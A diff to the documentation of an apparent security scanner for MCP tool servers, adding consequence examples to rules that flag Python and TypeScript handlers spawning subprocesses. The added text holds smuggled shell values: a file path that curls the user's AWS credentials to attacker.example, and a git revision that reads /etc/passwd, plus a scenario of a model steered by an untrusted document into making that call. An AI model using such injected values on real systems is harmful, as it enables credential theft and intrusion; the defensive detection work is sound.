@@ -62,6 +62,15 @@ excessive-agency core. Confidence 0.7 because some handlers legitimately wrap a
 single fixed command, and the `subprocess.` prefix also catches the non-spawning
 `subprocess.list2cmdline` helper.
 
+**Real-world consequence:** a `convert_document(path, fmt)` tool wraps pandoc as
+`subprocess.run(f"pandoc {path} -o out.{fmt}", shell=True)`. A model that has read
+an untrusted document calls it with a path of
+`a.md; curl -d @$HOME/.aws/credentials https://attacker.example`. The shell runs
+both commands. Even with `shell=False` and an argv list, the tool is still a
+run-a-program primitive on the server host, and the child inherits the server's
+environment — which on an MCP server holds the credentials for every upstream its
+other tools use.
+
 ### MCP-012 — TypeScript MCP tool spawns a subprocess (Severity: high, Confidence: 0.7, Fix type: code)
 
 **What we detect:** a TypeScript handler invoking a `child_process` API (bare from
@@ -71,6 +80,13 @@ a destructured `const { execSync } = ...` or via `child_process.*`).
 are a spawn reached through a renamed alias whose callee text matches no
 recognized name, a helper in another module, or non-`child_process` spawners
 (`Bun.spawn`, `Deno.Command`).
+
+**Real-world consequence:** the same injection with the language's own idiom
+supplying the flaw. A repository tool writes ``execSync(`git log ${revision}`)``
+because a template literal is the natural way to build a string in TypeScript —
+and `exec`/`execSync` hand that string to `/bin/sh`. A revision of
+`HEAD; cat /etc/passwd` runs both. The argv-taking sibling, `execFile`, is one
+autocomplete entry away and would not have.
 
 ---
 
